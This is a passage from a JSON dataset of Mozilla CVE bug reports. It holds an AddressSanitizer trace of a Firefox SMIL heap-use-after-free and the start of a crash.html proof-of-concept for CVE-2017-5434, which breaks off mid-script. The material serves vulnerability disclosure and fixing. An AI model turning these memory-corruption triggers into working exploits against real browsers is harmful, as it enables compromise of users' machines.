        "description": "The attached testcase (crash.html) crashes the latest ASAN build of Firefox (BuildID=20170313233726) as follows. The testcase requires the attached mini.svg. ================================================================= ==28440==ERROR: AddressSanitizer: heap-use-after-free on address 0x616000199dc8 at pc 0x7f8edf28b179 bp 0x7ffe8c450540 sp 0x7ffe8c450538 READ of size 8 at 0x616000199dc8 thread T0 (Web Content) #0 0x7f8edf28b178 in Equals /home/worker/workspace/build/src/dom/smil/nsSMILTargetIdentifier.h:75:38 #1 0x7f8edf28b178 in UpdateCachedTarget /home/worker/workspace/build/src/dom/smil/nsSMILAnimationFunction.cpp:336 #2 0x7f8edf28b178 in nsSMILCompositor::GetFirstFuncToAffectSandwich() /home/worker/workspace/build/src/dom/smil/nsSMILCompositor.cpp:168 #3 0x7f8edf27f4cd in nsSMILCompositor::ComposeAttribute(bool&) /home/worker/workspace/build/src/dom/smil/nsSMILCompositor.cpp:80:33 #4 0x7f8edf27d57d in nsSMILAnimationController::DoSample(bool) /home/worker/workspace/build/src/dom/smil/nsSMILAnimationController.cpp:453:5 #5 0x7f8edec24a21 in mozilla::dom::SVGAnimationElement::ActivateByHyperlink() /home/worker/workspace/build/src/dom/svg/SVGAnimationElement.cpp:404:7 #6 0x7f8edfefd6a9 in mozilla::PresShell::GoToAnchor(nsAString_internal const&, bool, unsigned int) /home/worker/workspace/build/src/layout/base/PresShell.cpp:3185:7 #7 0x7f8ee24d1ac6 in nsDocShell::ScrollToAnchor(bool, bool, nsACString_internal&, unsigned int) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:11533:12 #8 0x7f8ee246bc3c in nsDocShell::InternalLoad(nsIURI*, nsIURI*, bool, nsIURI*, unsigned int, nsIPrincipal*, nsIPrincipal*, unsigned int, nsAString_internal const&, char const*, nsAString_internal const&, nsIInputStream*, nsIInputStream*, unsigned int, nsISHEntry*, bool, nsAString_internal const&, nsIDocShell*, nsIURI*, bool, nsIDocShell**, nsIRequest**) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:10495:12 #9 0x7f8ee24642fe in nsDocShell::LoadURI(nsIURI*, nsIDocShellLoadInfo*, unsigned int, bool) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:1573:10 #10 0x7f8edbe6caf5 in mozilla::dom::Location::SetURI(nsIURI*, bool) /home/worker/workspace/build/src/dom/base/Location.cpp:288:12 #11 0x7f8edbe6d655 in mozilla::dom::Location::SetHash(nsAString_internal const&) /home/worker/workspace/build/src/dom/base/Location.cpp:341:10 #12 0x7f8edc5fdaf5 in SetHash /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/Location.h:209:14 #13 0x7f8edc5fdaf5 in mozilla::dom::LocationBinding::set_hash(JSContext*, JS::Handle<JSObject*>, mozilla::dom::Location*, JSJitSetterCallArgs) /home/worker/workspace/build/src/obj-firefox/dom/bindings/LocationBinding.cpp:703 #14 0x7f8edd9923e2 in mozilla::dom::GenericBindingSetter(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:2921:8 #15 0x7f8ee345d67f in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:282:15 #16 0x7f8ee345d67f in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:448 #17 0x7f8ee345f3e4 in InternalCall /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:493:12 #18 0x7f8ee345f3e4 in Call /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:512 #19 0x7f8ee345f3e4 in js::CallSetter(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::Handle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:641 #20 0x7f8ee408aaea in js::SetPropertyIgnoringNamedGetter(JSContext*, JS::Handle<JSObject*>, JS::Handle<jsid>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::Handle<JS::PropertyDescriptor>, JS::ObjectOpResult&) /home/worker/workspace/build/src/js/src/proxy/BaseProxyHandler.cpp:245:10 #21 0x7f8edd99dd79 in mozilla::dom::DOMProxyHandler::set(JSContext*, JS::Handle<JSObject*>, JS::Handle<jsid>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::ObjectOpResult&) const /home/worker/workspace/build/src/dom/bindings/DOMJSProxyHandler.cpp:258:10 #22 0x7f8ee40bb1f4 in js::Proxy::set(JSContext*, JS::Handle<JSObject*>, JS::Handle<jsid>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::ObjectOpResult&) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:369:12 #23 0x7f8ee3fa53fa in JSObject::nonNativeSetProperty(JSContext*, JS::Handle<JSObject*>, JS::Handle<jsid>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::ObjectOpResult&) /home/worker/workspace/build/src/js/src/jsobj.cpp:1049:12 #24 0x7f8ee40dd25c in SetProperty /home/worker/workspace/build/src/js/src/vm/NativeObject.h:1458:16 #25 0x7f8ee40dd25c in js::Wrapper::set(JSContext*, JS::Handle<JSObject*>, JS::Handle<jsid>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::ObjectOpResult&) const /home/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:152 #26 0x7f8ee40922be in js::CrossCompartmentWrapper::set(JSContext*, JS::Handle<JSObject*>, JS::Handle<jsid>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::ObjectOpResult&) const /home/worker/workspace/build/src/js/src/proxy/CrossCompartmentWrapper.cpp:238:5 #27 0x7f8ee40bb1f4 in js::Proxy::set(JSContext*, JS::Handle<JSObject*>, JS::Handle<jsid>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::ObjectOpResult&) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:369:12 #28 0x7f8ee3fa53fa in JSObject::nonNativeSetProperty(JSContext*, JS::Handle<JSObject*>, JS::Handle<jsid>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::ObjectOpResult&) /home/worker/workspace/build/src/js/src/jsobj.cpp:1049:12 #29 0x7f8ee343cdcf in SetProperty /home/worker/workspace/build/src/js/src/vm/NativeObject.h:1458:16 #30 0x7f8ee343cdcf in SetPropertyOperation /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:243 #31 0x7f8ee343cdcf in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2747 #32 0x7f8ee34297ab in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:394:12 #33 0x7f8ee345d996 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:466:15 #34 0x7f8ee345e072 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:512:10 #35 0x7f8ee3e34d8c in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2887:12 #36 0x7f8edd4117e2 in mozilla::dom::EventListener::HandleEvent(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, mozilla::ErrorResult&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/EventListenerBinding.cpp:47:8 #37 0x7f8eddd96a8e in HandleEvent<mozilla::dom::EventTarget *> /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventListenerBinding.h:65:12 #38 0x7f8eddd96a8e in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1119 #39 0x7f8eddd98a58 in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1297:20 #40 0x7f8eddd83133 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:465:5 #41 0x7f8eddd869f7 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:822:9 #42 0x7f8edbcc09ce in nsGlobalWindow::PostHandleEvent(mozilla::EventChainPostVisitor&) /home/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:3812:7 #43 0x7f8eddd83245 in PostHandleEvent /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:416:3 #44 0x7f8eddd83245 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:468 #45 0x7f8eddd83854 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:518:5 #46 0x7f8eddd869f7 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:822:9 #47 0x7f8edffe32a6 in nsDocumentViewer::LoadComplete(nsresult) /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:1043:7 #48 0x7f8ee24bd63a in nsDocShell::EndPageLoad(nsIWebProgress*, nsIChannel*, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7642:5 #49 0x7f8ee24b94e4 in nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7436:7 #50 0x7f8ee24c0cff in non-virtual thunk to nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7333:13 #51 0x7f8edafbcbc0 in nsDocLoader::DoFireOnStateChange(nsIWebProgress*, nsIRequest*, int&, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:1258:3 #52 0x7f8edafbbb58 in nsDocLoader::doStopDocumentLoad(nsIRequest*, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:842:5 #53 0x7f8edafb88b6 in nsDocLoader::DocLoaderIsEmpty(bool) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:732:9 #54 0x7f8edafba9b4 in nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:614:5 #55 0x7f8edafbb56c in non-virtual thunk to nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:470:14 #56 0x7f8ed96dc25b in mozilla::net::nsLoadGroup::RemoveRequest(nsIRequest*, nsISupports*, nsresult) /home/worker/workspace/build/src/netwerk/base/nsLoadGroup.cpp:634:18 #57 0x7f8edc0216ab in nsDocument::DoUnblockOnload() /home/worker/workspace/build/src/dom/base/nsDocument.cpp:8863:7 #58 0x7f8edc02124b in nsDocument::UnblockOnload(bool) /home/worker/workspace/build/src/dom/base/nsDocument.cpp:8789:9 #59 0x7f8edbff727c in nsDocument::DispatchContentLoadedEvents() /home/worker/workspace/build/src/dom/base/nsDocument.cpp:5294:3 #60 0x7f8edc0c7192 in applyImpl<nsDocument, void (nsDocument::*)()> /home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:855:12 #61 0x7f8edc0c7192 in apply<nsDocument, void (nsDocument::*)()> /home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:861 #62 0x7f8edc0c7192 in mozilla::detail::RunnableMethodImpl<nsDocument*, void (nsDocument::*)(), true, false>::Run() /home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:890 #63 0x7f8ed94e7ab2 in mozilla::ValidatingDispatcher::Runnable::Run() /home/worker/workspace/build/src/xpcom/threads/Dispatcher.cpp:257:21 #64 0x7f8ed951c632 in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1264:7 #65 0x7f8ed9518ee0 in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:389:10 #66 0x7f8eda32ebff in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:96:21 #67 0x7f8eda2a02a8 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:3 #68 0x7f8eda2a02a8 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #69 0x7f8eda2a02a8 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #70 0x7f8edf7aabaf in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:3 #71 0x7f8ee2fea477 in XRE_RunAppShell() /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:871:12 #72 0x7f8eda2a02a8 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:3 #73 0x7f8eda2a02a8 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #74 0x7f8eda2a02a8 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #75 0x7f8ee2fe9e79 in XRE_InitChildProcess(int, char**, XREChildData const*) /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:695:7 #76 0x4e01b6 in content_process_main /home/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:64:19 #77 0x4e01b6 in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:286 #78 0x7f8ef4a1082f in __libc_start_main /build/glibc-t3gR2i/glibc-2.23/csu/../csu/libc-start.c:291 #79 0x41c3d8 in _start (/home/nils/fuzzer3/firefox/firefox+0x41c3d8) 0x616000199dc8 is located 584 bytes inside of 616-byte region [0x616000199b80,0x616000199de8) freed by thread T0 (Web Content) here: #0 0x4b2b2b in __interceptor_free /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:38:3 #1 0x7f8ed93ba7c4 in SnowWhiteKiller::~SnowWhiteKiller() /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2664:9 #2 0x7f8ed93ba3b6 in nsCycleCollector::FreeSnowWhite(bool) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2839:3 #3 0x7f8ed93c1775 in nsCycleCollector::BeginCollection(ccType, nsICycleCollectorListener*) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3839:3 #4 0x7f8ed93c0f30 in nsCycleCollector::Collect(ccType, js::SliceBudget&, nsICycleCollectorListener*, bool) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3661:9 #5 0x7f8ed93c3e14 in nsCycleCollector_collect(nsICycleCollectorListener*) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:4157:3 #6 0x7f8edc105b30 in nsJSContext::CycleCollectNow(nsICycleCollectorListener*, int) /home/worker/workspace/build/src/dom/base/nsJSEnvironment.cpp:1452:3 #7 0x7f8edbc5e1fd in nsDOMWindowUtils::CycleCollect(nsICycleCollectorListener*, int) /home/worker/workspace/build/src/dom/base/nsDOMWindowUtils.cpp:1339:3 #8 0x7f8ed9537d81 in NS_InvokeByIndex /home/worker/workspace/build/src/xpcom/reflect/xptcall/md/unix/xptcinvoke_asm_x86_64_unix.S:115 #9 0x7f8edadd2a87 in Invoke /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:2010:12 #10 0x7f8edadd2a87 in Call /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1329 #11 0x7f8edadd2a87 in XPCWrappedNative::CallMethod(XPCCallContext&, XPCWrappedNative::CallMode) /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1296 #12 0x7f8edadda3fb in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:983:12 #13 0x7f8ee345d67f in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:282:15 #14 0x7f8ee345d67f in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:448 #15 0x7f8ee3444172 in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:499:12 #16 0x7f8ee3444172 in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2954 #17 0x7f8ee34297ab in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:394:12 #18 0x7f8ee345d996 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:466:15 #19 0x7f8ee345e072 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:512:10 #20 0x7f8ee3e32fd3 in JS_CallFunctionValue(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2828:12 #21 0x7f8edad11519 in xpc::FunctionForwarder(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/xpconnect/src/ExportHelpers.cpp:319:18 #22 0x7f8ee345d67f in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:282:15 #23 0x7f8ee345d67f in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:448 #24 0x7f8ee3444172 in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:499:12 #25 0x7f8ee3444172 in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2954 #26 0x7f8ee34297ab in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:394:12 #27 0x7f8ee345d996 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:466:15 #28 0x7f8ee345e072 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:512:10 #29 0x7f8ee40dd89c in js::Wrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:165:12 #30 0x7f8ee409452e in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/CrossCompartmentWrapper.cpp:353:14 #31 0x7f8ee40bd309 in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:464:12 #32 0x7f8ee40bfc34 in js::proxy_Call(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:716:12 #33 0x7f8ee345d727 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:282:15 #34 0x7f8ee345d727 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:436 #35 0x7f8ee345e072 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:512:10 #36 0x7f8ee3e34d8c in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2887:12 previously allocated by thread T0 (Web Content) here: #0 0x4b2e4b in malloc /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:52:3 #1 0x4e11bd in moz_xmalloc /home/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:83:17 #2 0x7f8edec04339 in operator new /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:194:12 #3 0x7f8edec04339 in NS_NewSVGAnimateElement(nsIContent**, already_AddRefed<mozilla::dom::NodeInfo>&&) /home/worker/workspace/build/src/dom/svg/SVGAnimateElement.cpp:10 #4 0x7f8edec32156 in NS_NewSVGElement(mozilla::dom::Element**, already_AddRefed<mozilla::dom::NodeInfo>&&, mozilla::dom::FromParser) /home/worker/workspace/build/src/dom/svg/SVGElementFactory.cpp:130:19 #5 0x7f8edc12a6ee in NS_NewElement(mozilla::dom::Element**, already_AddRefed<mozilla::dom::NodeInfo>&&, mozilla::dom::FromParser, nsAString_internal const*) /home/worker/workspace/build/src/dom/base/nsNameSpaceManager.cpp:231:14 #6 0x7f8edf381810 in nsXMLContentSink::CreateElement(char16_t const**, unsigned int, mozilla::dom::NodeInfo*, unsigned int, nsIContent**, bool*, mozilla::dom::FromParser) /home/worker/workspace/build/src/dom/xml/nsXMLContentSink.cpp:472:8 #7 0x7f8edf3856f7 in nsXMLContentSink::HandleStartElement(char16_t const*, char16_t const**, unsigned int, unsigned int, bool) /home/worker/workspace/build/src/dom/xml/nsXMLContentSink.cpp:966:12 #8 0x7f8edb08f7de in nsExpatDriver::HandleStartElement(char16_t const*, char16_t const**) /home/worker/workspace/build/src/parser/htmlparser/nsExpatDriver.cpp:380:19 #9 0x7f8ee0f96fd1 in doContent /home/worker/workspace/build/src/parser/expat/lib/xmlparse.c:2468:11 #10 0x7f8ee0f87fcd in contentProcessor /home/worker/workspace/build/src/parser/expat/lib/xmlparse.c:2098:27 #11 0x7f8ee0f87fcd in doProlog /home/worker/workspace/build/src/parser/expat/lib/xmlparse.c:4078 #12 0x7f8ee0f7de91 in prologProcessor /home/worker/workspace/build/src/parser/expat/lib/xmlparse.c:3812:10 #13 0x7f8ee0f7de91 in prologInitProcessor /home/worker/workspace/build/src/parser/expat/lib/xmlparse.c:3629 #14 0x7f8ee0f7c062 in MOZ_XML_Parse /home/worker/workspace/build/src/parser/expat/lib/xmlparse.c:1530:17 #15 0x7f8edb0952be in nsExpatDriver::ParseBuffer(char16_t const*, unsigned int, bool, unsigned int*) /home/worker/workspace/build/src/parser/htmlparser/nsExpatDriver.cpp:1014:16 #16 0x7f8edb09639a in nsExpatDriver::ConsumeToken(nsScanner&, bool&) /home/worker/workspace/build/src/parser/htmlparser/nsExpatDriver.cpp:1112:5 #17 0x7f8edb0a366b in nsParser::Tokenize(bool) /home/worker/workspace/build/src/parser/htmlparser/nsParser.cpp:1532:16 #18 0x7f8edb09ef28 in nsParser::ResumeParse(bool, bool, bool) /home/worker/workspace/build/src/parser/htmlparser/nsParser.cpp:1053:41 #19 0x7f8edb0a47af in nsParser::OnDataAvailable(nsIRequest*, nsISupports*, nsIInputStream*, unsigned long, unsigned int) /home/worker/workspace/build/src/parser/htmlparser/nsParser.cpp:1430:12 #20 0x7f8ed9688b72 in nsBaseChannel::OnDataAvailable(nsIRequest*, nsISupports*, nsIInputStream*, unsigned long, unsigned int) /home/worker/workspace/build/src/netwerk/base/nsBaseChannel.cpp:856:17 #21 0x7f8ed96d4613 in nsInputStreamPump::OnStateTransfer() /home/worker/workspace/build/src/netwerk/base/nsInputStreamPump.cpp:601:22 #22 0x7f8ed96d300a in nsInputStreamPump::OnInputStreamReady(nsIAsyncInputStream*) /home/worker/workspace/build/src/netwerk/base/nsInputStreamPump.cpp:429:25 #23 0x7f8ed94b9afd in nsInputStreamReadyEvent::Run() /home/worker/workspace/build/src/xpcom/io/nsStreamUtils.cpp:96:9 #24 0x7f8ed951c632 in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1264:7 #25 0x7f8ed9518ee0 in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:389:10 #26 0x7f8eda32ebff in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:96:21 #27 0x7f8eda2a02a8 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:3 #28 0x7f8eda2a02a8 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #29 0x7f8eda2a02a8 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #30 0x7f8edf7aabaf in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:3 #31 0x7f8ee2fea477 in XRE_RunAppShell() /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:871:12 #32 0x7f8eda2a02a8 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:3 #33 0x7f8eda2a02a8 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #34 0x7f8eda2a02a8 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #35 0x7f8ee2fe9e79 in XRE_InitChildProcess(int, char**, XREChildData const*) /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:695:7 #36 0x4e01b6 in content_process_main /home/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:64:19 #37 0x4e01b6 in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:286 SUMMARY: AddressSanitizer: heap-use-after-free /home/worker/workspace/build/src/dom/smil/nsSMILTargetIdentifier.h:75:38 in Equals Shadow bytes around the buggy address: 0x0c2c8002b360: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c2c8002b370: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c2c8002b380: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c2c8002b390: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c2c8002b3a0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd =>0x0c2c8002b3b0: fd fd fd fd fd fd fd fd fd[fd]fd fd fd fa fa fa 0x0c2c8002b3c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c2c8002b3d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c2c8002b3e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c2c8002b3f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c2c8002b400: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==28440==ABORTING"
      }
    ],
    "CVE-2017-5434": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1349946",
        "title": "heap-use-after-free in nsFocusManager::CheckIfFocusable",
        "description": "The following testcases crashes the latest ASAN build of Firefox (BuildID=20170322145832). crash.html: <script> function start () { o2=document.createElementNS('http://www.w3.org/1999/xhtml','div'); o8=document.createRange(); o16=document.createElementNS('http://www.w3.org/1999/xhtml','input'); o20=document.createElementNS('http://www.w3.org/1999/xhtml','iframe'); o21=o8.cloneRange(); o28=document.createElementNS('http://www.w3.org/1999/xhtml','strike'); o36=document.createElementNS('http://www.w3.org/1999/xhtml','tfoot'); o28.prepend(\"x\",\"x\",\"x\"); o37=document.createElementNS('http://www.w3.org/1999/xhtml','area'); o28.appendChild(o2); o56=document.createElementNS('http://www.w3.org/1999/xhtml','iframe'); o57=o2.previousSibling; o83=document.createElementNS('http://www.w3.org/1999/xhtml','input'); o20.appendChild(o83); document.documentElement.appendChild(o28); o36.appendChild(o56); o21.setStartBefore(o57); o16.appendChild(o20); document.documentElement.innerHTML=''; o21.surroundContents(o37); 